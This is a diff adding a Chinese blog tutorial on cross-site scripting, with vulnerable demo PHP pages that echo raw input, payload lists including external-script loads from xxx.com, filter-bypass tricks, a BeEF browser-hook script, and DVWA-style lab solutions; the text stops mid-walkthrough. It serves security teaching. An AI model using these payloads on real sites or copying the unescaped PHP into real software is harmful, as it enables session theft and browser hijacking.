@@ -3,6 +3,348 @@
   
     
     <entry>
+      <title><![CDATA[web安全-XSS]]></title>
+      <url>/2021/02/01/XSS/</url>
+      <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
+<p>Author:<code>wisejay</code></p>
+<p>Email:<code>wisejay@foxmail.com</code></p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>跨站脚本（cross site script，XSS），XSS 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而把恶意代码嵌入到 web 页面中去。当别的用户访问都会执行相应的恶意代码。从而盗取用户cookie、劫持会话，钓鱼欺骗等攻击的方式。 </p>
+<h2 id="常用测试语句"><a href="#常用测试语句" class="headerlink" title="常用测试语句"></a>常用测试语句</h2><ul>
+<li><code>&lt;script&gt;</code>标签是最直接的 XSS 有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中 </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; #弹窗xss</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;#获取cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;#引用外部js</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>img</code>标签</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;#弹窗</span><br><span class="line">&lt;img src=1 onerror=document.body.appendChild(document.createElement(&apos;script&apos;)).src=&quot;http://xxx.com/xss.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其他标签</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=alert(&apos;xss&apos;)&gt;#点击弹窗</span><br><span class="line">&lt;input onfocus=alert(&apos;xss&apos;)&gt;#聚焦弹窗</span><br><span class="line">&lt;input onmouseover=alert(&apos;xss&apos;)&gt;#鼠标移动到指定位置弹窗</span><br><span class="line">&lt;body onload=alert(&apos;xss&apos;)&gt;#页面加载时弹窗</span><br><span class="line">&lt;a href=javascript:alert(/img/xss/1)&gt;XXX&lt;/a&gt;#点击XXX弹窗</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><code>反射型也称作非持久型，主要用于将恶意脚本插入到URL地址参数中，即每次攻击都需要用户点击，通常结合社会工程学进行攻击</code></p>
+<p>正常发送信息：<code>http:127.0.0.1/xss.php?name=wisejay</code></p>
+<p>反射型XSS攻击：<code>http:127.0.0.1/xss.php?name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<blockquote>
+<p>打开者如果弹窗显示XSS，则说明存在反射型XSS</p>
+</blockquote>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//前端1.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后端xss.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">	<span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<figure class="image-box">
+                <img src="/img/xss/1597249147737.png" alt="1597249147737" title class>
+                <p>1597249147737</p>
+            </figure>
+
+<figure class="image-box">
+                <img src="/img/xss/1597249160807.png" alt="1597249160807" title class>
+                <p>1597249160807</p>
+            </figure>
+
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><code>存储型也称作持久型，这类XSS攻击，不需要用户点击特定的URL，因为攻击者是将恶意代码插入服务器(数据库)中，当用户浏览相应的网页时就会触发</code></p>
+<p>这类型的XSS一般存在留言板中</p>
+<p>如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">“这里是用户填写的数据</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但用户传入value参数为:<code>&lt;script&gt;alert(‘xss’)&lt;/script&gt;</code>就会存储到数据库中，访问时就会被触发。</p>
+</blockquote>
+<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//创建数据库</span><br><span class="line">create database test;</span><br><span class="line">use test;</span><br><span class="line">create table xss(</span><br><span class="line">id int(3) not null,</span><br><span class="line">name varchar(200) not null,</span><br><span class="line">primary key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//2.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>存储型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            输入你ID:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            输入你NAME:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//save.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $id=$_POST[<span class="string">"id"</span>];</span><br><span class="line">	$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line">	</span><br><span class="line">	$sql=<span class="string">"insert into xss value ($id,'$name')"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">	$sql=<span class="string">"select name from xss where id=$id"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">    <span class="keyword">while</span>($row=mysql_fetch_array($result))&#123; </span><br><span class="line">      <span class="keyword">echo</span> $row[<span class="string">'name'</span>]; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;alert(\&#39;xss\&#39;)&lt;/script&gt;</code>\用来转义</p>
+<figure class="image-box">
+                <img src="/img/xss/1597249586099.png" alt="1597249586099" title class>
+                <p>1597249586099</p>
+            </figure>
+
+<p>查看数据库插入情况发现刚刚语句被插入到数据库中啦</p>
+<figure class="image-box">
+                <img src="/img/xss/1597251966287.png" alt="1597251966287" title class>
+                <p>1597251966287</p>
+            </figure>
+
+<p>在查看页面查看数据<code>http://127.0.0.1/xss/show.php?id=1</code>发现语句被成功执行</p>
+<figure class="image-box">
+                <img src="/img/xss/1597252051220.png" alt="1597252051220" title class>
+                <p>1597252051220</p>
+            </figure>
+
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><code>DOM型是一种特殊的非持久型，用户能够通过交互修改浏览器页面中的 DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞</code></p>
+<p>payload:<code>http://127.0.0.1/dom.php?name=&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</code></p>
+<blockquote>
+<p>当用户访问时，服务器就会返回包含恶意脚本的HTML静态文本，浏览器会把HTML解析成DOM，等于在网页直接插入</p>
+</blockquote>
+<h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//3.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"dom.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//dom.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$name=$_POST[&quot;name&quot;];	</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name;?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">    var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">    print.innerHTML=text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<figure class="image-box">
+                <img src="/img/xss/1597252179215.png" alt="1597252179215" title class>
+                <p>1597252179215</p>
+            </figure>
+
+<figure class="image-box">
+                <img src="/img/xss/1597252486630.png" alt="1597252486630" title class>
+                <p>1597252486630</p>
+            </figure>
+
+<h3 id="三者区别"><a href="#三者区别" class="headerlink" title="三者区别"></a>三者区别</h3><table>
+<thead>
+<tr>
+<th align="center">XSS类型</th>
+<th align="center">反射型</th>
+<th align="center">存储型</th>
+<th align="center">DOM型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">触发过程</td>
+<td align="center">正常用户访问携带XSS恶意脚本的URL</td>
+<td align="center">正常用户访问黑客恶意构造存储在数据库输出的地方</td>
+<td align="center">正常用户访问携带XSS恶意脚本的URL</td>
+</tr>
+<tr>
+<td align="center">数据存储</td>
+<td align="center">URL</td>
+<td align="center">数据库</td>
+<td align="center">URL</td>
+</tr>
+<tr>
+<td align="center">谁来输出</td>
+<td align="center">前端web程序</td>
+<td align="center">前端web程序</td>
+<td align="center">前端JavaScript</td>
+</tr>
+<tr>
+<td align="center">输出位置</td>
+<td align="center">HTTP响应中</td>
+<td align="center">HTTP响应中</td>
+<td align="center">动态构造的DOM结点</td>
+</tr>
+<tr>
+<td align="center">数据流向</td>
+<td align="center">前端–&gt;后端–&gt;前端</td>
+<td align="center">前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</td>
+<td align="center">前端–&gt;浏览器</td>
+</tr>
+</tbody></table>
+<h2 id="XSS绕过和闭合"><a href="#XSS绕过和闭合" class="headerlink" title="XSS绕过和闭合"></a>XSS绕过和闭合</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p><code>&lt;ImG SrC=1 OnerRor=alert(&#39;xss&#39;)&gt;</code></p>
+<h4 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h4><p><code>&lt;imimgg srsrcc=1 onerror=alert(&#39;xxs&#39;)&gt;</code></p>
+<h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><p><code>&lt;img src=1 onerror=alert(</code>`xss`<code>)&gt;</code></p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>URL编码、Base64编码等</p>
+<h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><h4 id="能闭合标签"><a href="#能闭合标签" class="headerlink" title="能闭合标签"></a>能闭合标签</h4><ul>
+<li>用户输入作为HTML注释内容</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户输入内容 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>--&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;!--</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为标签属性名</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为标签属性值</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"用户输入"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a=&quot;x</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为标签名</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">用户输入</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;b</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为CSS内容</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>用户输入内容<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&lt;/style&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;style&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="不能闭合标签"><a href="#不能闭合标签" class="headerlink" title="不能闭合标签"></a>不能闭合标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">'输入内容'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&#39; onfocus=&#39;alter(/img/xss/xss/)</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">''</span> <span class="attr">onfocus</span>=<span class="string">'alter(/img/xss/xss/)'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="工具使用-Beef"><a href="#工具使用-Beef" class="headerlink" title="工具使用(Beef)"></a>工具使用(Beef)</h2><blockquote>
+<p>以kali系统为准</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>启动beef</span><br><span class="line">beef-xss</span><br><span class="line"><span class="meta">#</span>启动成功后生成xss钩子</span><br><span class="line">[*]    Hook: &lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</span><br><span class="line">[*] Example: &lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</span><br><span class="line"><span class="meta">#</span>web UI界面</span><br><span class="line">[*]  Web UI: http://127.0.0.1:3000/ui/panel</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>登录UI管理界面</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597405925377.png" alt="1597405925377" title class>
+                <p>1597405925377</p>
+            </figure>
+
+<blockquote>
+<p>然后将<code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>作为xss语句注入，钩子被触发，目标就会自动上线</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597406088818.png" alt="1597406088818" title class>
+                <p>1597406088818</p>
+            </figure>
+
+<blockquote>
+<p>这里命令慢慢摸索吧</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597409122987.png" alt="1597409122987" title class>
+                <p>1597409122987</p>
+            </figure>
+
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h3><h4 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h4><blockquote>
+<p>XSS原则见框就插，我们发现这里不管输入说明都直接回显</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597310308297.png" alt="1597310308297" title class>
+                <p>1597310308297</p>
+            </figure>
+
+<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<blockquote>
+<p>插入测试语句发现直接弹窗</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597310549808.png" alt="1597310549808" title class>
+                <p>1597310549808</p>
+            </figure>
+
+<h4 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h4><blockquote>
+<p>这里我们直接输入测试语句发<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597310786907.png" alt="1597310786907" title class>
+                <p>1597310786907</p>
+            </figure>
+
+<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<blockquote>
+<p>这里我们直接用img标签插入成功回弹，这里可以使用大小写绕过</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597310947363.png" alt="1597310947363" title class>
+                <p>1597310947363</p>
+            </figure>
+
+<h4 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h4><blockquote>
+<p>通过测试发现这里过滤<code>&lt;script&gt;</code>开头的语句,所以使用<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597319991473.png" alt="1597319991473" title class>
+                <p>1597319991473</p>
+            </figure>
+
+<h3 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h3><h4 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h4><blockquote>
+<p>输入内容发现，会保存到数据库，每次打开都会查询并显示出来</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597320660164.png" alt="1597320660164" title class>
+                <p>1597320660164</p>
+            </figure>
+
+<p>name：<code>test</code></p>
+<p>message：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<figure class="image-box">
+                <img src="/img/xss/1597320803531.png" alt="1597320803531" title class>
+                <p>1597320803531</p>
+            </figure>
+
+<h4 id="MEDIUM-1"><a href="#MEDIUM-1" class="headerlink" title="MEDIUM"></a>MEDIUM</h4><blockquote>
+<p>这里过滤了<code>&lt;script&gt;</code>标签,并且message也过滤了<code>img</code>标签，所以我尝试在name中插入，但是name有长度限制我们抓包修改一下</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597321652662.png" alt="1597321652662" title class>
+                <p>1597321652662</p>
+            </figure>
+
+<p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p>message：<code>test</code></p>
+<figure class="image-box">
+                <img src="/img/xss/1597322464689.png" alt="1597322464689" title class>
+                <p>1597322464689</p>
+            </figure>
+
+<blockquote>
+<p>抓包修改了，成功执行xss语句</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597322478517.png" alt="1597322478517" title class>
+                <p>1597322478517</p>
+            </figure>
+
+<h4 id="HIGH-1"><a href="#HIGH-1" class="headerlink" title="HIGH"></a>HIGH</h4><blockquote>
+<p>这里我们直接用<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>尝试发现都给过滤了，然后采用<code>img</code>标签尝试，但是name依旧有长度限制，我们这次尝试在浏览器中修改长度</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597322686394.png" alt="1597322686394" title class>
+                <p>1597322686394</p>
+            </figure>
+
+<figure class="image-box">
+                <img src="/img/xss/1597322735493.png" alt="1597322735493" title class>
+                <p>1597322735493</p>
+            </figure>
+
+<p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<p>message：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<blockquote>
+<p>语句成功执行</p>
+</blockquote>
+<figure class="image-box">
+                <img src="/img/xss/1597322751829.png" alt="1597322751829" title class>
